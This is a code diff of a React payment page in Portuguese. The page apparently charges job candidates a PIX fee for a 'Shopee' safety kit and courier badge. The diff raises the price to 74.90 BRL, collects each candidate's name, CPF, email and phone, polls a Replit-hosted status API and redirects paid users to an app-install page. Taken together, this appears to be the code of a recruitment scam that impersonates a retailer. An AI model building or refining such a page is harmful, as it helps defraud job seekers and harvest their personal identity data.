@@ -16,7 +16,7 @@ import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } f
 import { Spinner } from '@/components/ui/spinner';
 import { useScrollTop } from '@/hooks/use-scroll-top';
 import { API_BASE_URL } from '../lib/api-config';
-import { createPixPayment } from '../lib/4mpagamentos-api';
+import { createPixPayment } from '../lib/payments-api';
 import { initFacebookPixel, trackEvent, trackPurchase, checkPaymentStatus } from '../lib/facebook-pixel';
 import EPIConfirmationModal from '@/components/EPIConfirmationModal';
 import EntregadorCracha from '@/components/EntregadorCracha';
@@ -93,7 +93,10 @@ const Entrega: React.FC = () => {
     // Verificar se há um pagamento em andamento
     const currentPaymentId = localStorage.getItem('current_payment_id');
     if (currentPaymentId) {
-      console.log('[ENTREGA] Encontrado pagamento em andamento (gerenciado pela API 4mpagamentos):', currentPaymentId);
+      console.log('[ENTREGA] Encontrado pagamento em andamento:', currentPaymentId);
+      setTimeout(() => {
+        verificarStatusPagamento(currentPaymentId);
+      }, 1000);
     }
   }, []);
   
@@ -331,8 +334,8 @@ const Entrega: React.FC = () => {
       // Salvar endereço completo
       localStorage.setItem('endereco_entrega', JSON.stringify(data));
       
-      // Abrir diretamente o modal de pagamento (pular o popup de confirmação)
-      await processarPagamento();
+      // Mostrar o modal de confirmação primeiro
+      setShowConfirmationModal(true);
     } catch (error: any) {
       console.error("Erro ao processar endereço:", error);
       toast({
@@ -343,57 +346,31 @@ const Entrega: React.FC = () => {
     }
   };
   
-  // Função para processar o pagamento
+  // Função para processar o pagamento após a confirmação
   const processarPagamento = async () => {
     try {
-      // Abrir o modal de pagamento diretamente
+      // Fechar o modal de confirmação e abrir o de pagamento
+      setShowConfirmationModal(false);
       setShowPaymentModal(true);
       setIsLoading(true);
       
       // Limpar estado anterior de PIX
       setPixInfo(null);
       
-      // Obter dados completos do usuário do localStorage PRIMEIRO
+      // Verificar se temos os dados necessários do usuário
+      if (!dadosUsuario?.nome || !dadosUsuario?.cpf) {
+        throw new Error("Dados do usuário incompletos");
+      }
+      
+      // Obter dados completos do usuário do localStorage
       const userData = localStorage.getItem('candidato_data');
-      let nome = "";
-      let cpf = "";
       let email = "";
       let telefone = "";
       
-      console.log('[FRONTEND-DEBUG] Dados do localStorage candidato_data:', userData);
-      
       if (userData) {
-        try {
-          const parsedUserData = JSON.parse(userData);
-          console.log('[FRONTEND-DEBUG] Dados parseados:', parsedUserData);
-          
-          nome = parsedUserData.nome || parsedUserData.name || "";
-          cpf = parsedUserData.cpf || "";
-          email = parsedUserData.email || "";
-          telefone = parsedUserData.telefone || parsedUserData.phone || "";
-        } catch (error) {
-          console.error('[FRONTEND-ERROR] Erro ao parsear dados do localStorage:', error);
-        }
-      }
-      
-      // Fallback para dadosUsuario se localStorage falhou
-      if (!nome && dadosUsuario?.nome) {
-        nome = dadosUsuario.nome;
-      }
-      if (!cpf && dadosUsuario?.cpf) {
-        cpf = dadosUsuario.cpf;
-      }
-      
-      console.log('[FRONTEND-DEBUG] Dados finais para pagamento:', {
-        nome: nome,
-        cpf: cpf ? cpf.substring(0, 3) + '***' + cpf.substring(cpf.length - 2) : '',
-        email: email,
-        telefone: telefone
-      });
-      
-      // Verificar se temos os dados necessários
-      if (!nome || !cpf) {
-        throw new Error(`Dados essenciais não encontrados no localStorage: ${!nome ? 'Nome' : ''} ${!cpf ? 'CPF' : ''}`.trim());
+        const parsedUserData = JSON.parse(userData);
+        email = parsedUserData.email || "";
+        telefone = parsedUserData.telefone || "";
       }
       
       console.log('Iniciando processamento de pagamento For4Payments');
@@ -401,17 +378,16 @@ const Entrega: React.FC = () => {
       // Usar a função centralizada para processar o pagamento
       // Processar pagamento e obter resultado
       const pixData = await createPixPayment({
-        name: nome,
-        cpf: cpf,
+        name: dadosUsuario.nome,
+        cpf: dadosUsuario.cpf,
         email: email,
         phone: telefone
       });
       
       console.log('Pagamento processado com sucesso:', pixData);
       
-      // Verificar se recebemos todos os dados necessários da API 4mpagamentos
-      if (!pixData.pixCode || !pixData.id || !pixData.transactionId) {
-        console.error('[ENTREGA] Resposta incompleta da API:', pixData);
+      // Verificar se recebemos todos os dados necessários
+      if (!pixData.pixCode || !pixData.id) {
         throw new Error('Resposta incompleta da API de pagamento');
       }
       
@@ -427,15 +403,17 @@ const Entrega: React.FC = () => {
         content_name: 'Kit de Segurança Shopee',
         content_ids: [pixData.id],
         content_type: 'product',
-        value: 64.90,
+        value: 74.90,
         currency: 'BRL'
       });
       
       // Armazenar ID da transação para verificação posterior
       localStorage.setItem('current_payment_id', pixData.id);
       
-      // A nova API da 4mpagamentos já inicia verificação automática de status
-      console.log('[ENTREGA] Sistema de verificação de status automático iniciado pela API 4mpagamentos');
+      // Iniciar verificação de status imediatamente
+      setTimeout(() => {
+        verificarStatusPagamento(pixData.id);
+      }, 1000);
       
     } catch (error: any) {
       console.error("Erro ao processar pagamento:", error);
@@ -468,7 +446,62 @@ const Entrega: React.FC = () => {
     }
   };
   
-  // NOTA: Função removida - A nova API da 4mpagamentos gerencia verificação de status automaticamente
+  // Função para verificar o status do pagamento via API Recoveryfy
+  const verificarStatusPagamento = async (paymentId: string) => {
+    console.log('[ENTREGA] Verificando status do pagamento:', paymentId);
+    
+    try {
+      // Usar a nova API Recoveryfy para verificar status
+      const response = await fetch(`https://recoveryfy.replit.app/api/order/${paymentId}/status`);
+      
+      if (response.ok) {
+        const statusData = await response.json();
+        console.log('[ENTREGA] Status obtido:', statusData);
+        
+        // Verificar se o status é "approved"
+        if (statusData.status === 'approved') {
+          console.log('[ENTREGA] Pagamento APROVADO! Rastreando conversão...');
+          
+          // Rastrear o evento de compra no Facebook Pixel
+          trackPurchase(paymentId, 74.90);
+          
+          // Exibir mensagem de sucesso para o usuário
+          toast({
+            title: "Pagamento aprovado!",
+            description: "Seu pagamento foi confirmado com sucesso!",
+          });
+          
+          // Redirecionar instantaneamente para a página de treinamento
+          console.log('[ENTREGA] Redirecionando para página de treinamento...');
+          setLocation('/instalar-app');
+          
+          // Limpar o ID do pagamento do localStorage
+          localStorage.removeItem('current_payment_id');
+          
+          return; // Parar a verificação
+        } else {
+          // Se não está aprovado, agendar nova verificação em 1 segundo
+          setTimeout(() => {
+            verificarStatusPagamento(paymentId);
+          }, 1000);
+        }
+      } else {
+        console.error('[ENTREGA] Erro na API Recoveryfy:', response.status, response.statusText);
+        
+        // Em caso de erro HTTP, agendar nova tentativa em 1 segundo
+        setTimeout(() => {
+          verificarStatusPagamento(paymentId);
+        }, 1000);
+      }
+    } catch (error) {
+      console.error('[ENTREGA] Erro ao verificar status:', error);
+      
+      // Em caso de erro de rede, agendar nova tentativa em 1 segundo
+      setTimeout(() => {
+        verificarStatusPagamento(paymentId);
+      }, 1000);
+    }
+  };
 
   return (
     <div className="bg-white min-h-screen flex flex-col">
@@ -990,7 +1023,12 @@ const Entrega: React.FC = () => {
         </DialogContent>
       </Dialog>
       
-      {/* Modal de confirmação para o kit EPI - REMOVIDO - abre diretamente o pagamento */}
+      {/* Modal de confirmação para o kit EPI */}
+      <EPIConfirmationModal
+        isOpen={showConfirmationModal}
+        onOpenChange={setShowConfirmationModal}
+        onConfirm={processarPagamento}
+      />
 
       {/* Popup de status do pagamento - aparece 30 segundos após abrir o modal */}
       <Dialog open={showPaymentStatusPopup} onOpenChange={setShowPaymentStatusPopup}>
